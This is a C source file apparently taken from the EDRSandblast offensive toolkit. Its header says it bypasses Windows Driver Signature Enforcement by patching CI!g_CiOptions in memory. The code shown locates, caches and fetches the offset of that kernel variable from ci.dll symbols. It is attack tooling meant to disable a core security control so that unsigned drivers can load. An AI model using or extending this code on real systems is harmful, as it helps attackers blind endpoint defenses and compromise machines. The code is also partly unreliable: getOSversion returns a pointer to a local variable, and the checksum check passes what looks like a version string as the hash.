/*

--- Functions to bypass Digital Signature Enforcement by disabling DSE through patching of the g_CiOptions attributes in memory.
--- Full source and credit to https://j00ru.vexillium.org/2010/06/insight-into-the-driver-signature-enforcement/
--- Code adapted from: https://github.com/kkent030315/gdrv-loader/tree/1909_mitigation

*/

#include <tchar.h>
#include <stdio.h>

#include "../EDRSandblast.h"
#include "FileVersion.h"
#include "PdbSymbols.h"
#include "CiOffsets.h"

union CiOffsets g_ciOffsets = { 0 };

// Return the offsets of CI!g_CiOptions for the specific Windows version in use.
void LoadCiOffsetsFromFile(TCHAR* ciOffsetFilename,BOOL verbose) {
    LPTSTR ciVersion = GetCiVersion();
    //_tprintf_or_not(TEXT("[*] System's ci.dll file version is: %s\n"), ciVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, ciOffsetFilename, TEXT("r"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Ci offsets CSV file not found / invalid. A valid offset file must be specifed!\n"));
        return;
    }

    TCHAR lineCiVersion[256];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineCiVersion, _countof(lineCiVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        //---------------- START checksum diff
        //LPCWSTR filename = L"c:\\Windows\\system32\\ci.dll";
        //char ciSum[] = "ebfb1bcb35c2f695903e83d346e005830991b93df4d19c07c4661a3dcf797266";
        //if (sha256sum(filename, &ciSum) != 0) {
        if (sha256sum(GetCiPath(), &lineCiVersion,verbose) != 0) {
            if (verbose)
                _putts_or_not(TEXT("\n[LoadCiOffsetsFromFile] Bad ci.dll checksum"));
        }
        else {
            if (verbose) {
                _putts_or_not(TEXT("\n[LoadCiOffsetsFromFile] Good ci.dll checksum"));
            }
            //if (_tcscmp(ciVersion, lineCiVersion) == 0) {
            TCHAR* endptr;
            //_tprintf_or_not(TEXT("[+] Offsets are available for this version of ci.dll (%s)!"), ciVersion);
            for (int i = 0; i < _SUPPORTED_CI_OFFSETS_END; i++) {
                g_ciOffsets.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
            //}
        }
    }
    fclose(offsetFileStream);
}

void SaveCiOffsetsToFile(TCHAR* ciOffsetFilename) {
    LPTSTR ciVersion = GetCiVersion();

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, ciOffsetFilename, TEXT("a"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] CI offsets CSV file cannot be opened"));
        return;
    }

    _ftprintf(offsetFileStream, TEXT("%s"), ciVersion);
    for (int i = 0; i < _SUPPORTED_CI_OFFSETS_END; i++) {
        _ftprintf(offsetFileStream, TEXT(",%llx"), g_ciOffsets.ar[i]);
    }
    _fputts(TEXT(""), offsetFileStream);

    fclose(offsetFileStream);
}


void LoadCiOffsetsFromInternet(BOOL delete_pdb) {
    LPTSTR ciPath = GetCiPath();
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(ciPath);
    if (sym_ctx == NULL) {
        return;
    }
    g_ciOffsets.st.g_CiOptions = GetSymbolOffset(sym_ctx, "g_CiOptions");
    UnloadSymbols(sym_ctx, delete_pdb);
}

TCHAR g_ciPath[MAX_PATH] = { 0 };
LPTSTR GetCiPath() {
    if (_tcslen(g_ciPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        TCHAR systemDirectory[MAX_PATH] = { 0 };
        GetSystemDirectory(systemDirectory, _countof(systemDirectory));

        // Compute ci.dll path.
        _tcscat_s(g_ciPath, _countof(g_ciPath), systemDirectory);
        _tcscat_s(g_ciPath, _countof(g_ciPath), TEXT("\\ci.dll"));
    }
    return g_ciPath;
}

TCHAR g_ciVersion[256] = { 0 };
LPTSTR GetCiVersion() {
    if (_tcslen(g_ciVersion) == 0) {
        LPTSTR ciPath = GetCiPath();

        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), ciPath);

        _stprintf_s(g_ciVersion, 256, TEXT("ci_%s.dll"), versionBuffer);
    }
    return g_ciVersion;
}

//#include <windows.h>
//#include <stdio.h>
// code from https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversionexa
// Warning : GetVersionExA may be altered or unavailable for releases after Windows 8.1. 
// Instead, use the Version Helper functions.
// But with Helpers we cannot get the build number...that's why we still use this function
POSVERSIONINFO getOSversion()
{
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
#pragma warning(suppress : 4996)
    GetVersionEx(&osvi);
    return &osvi;
}

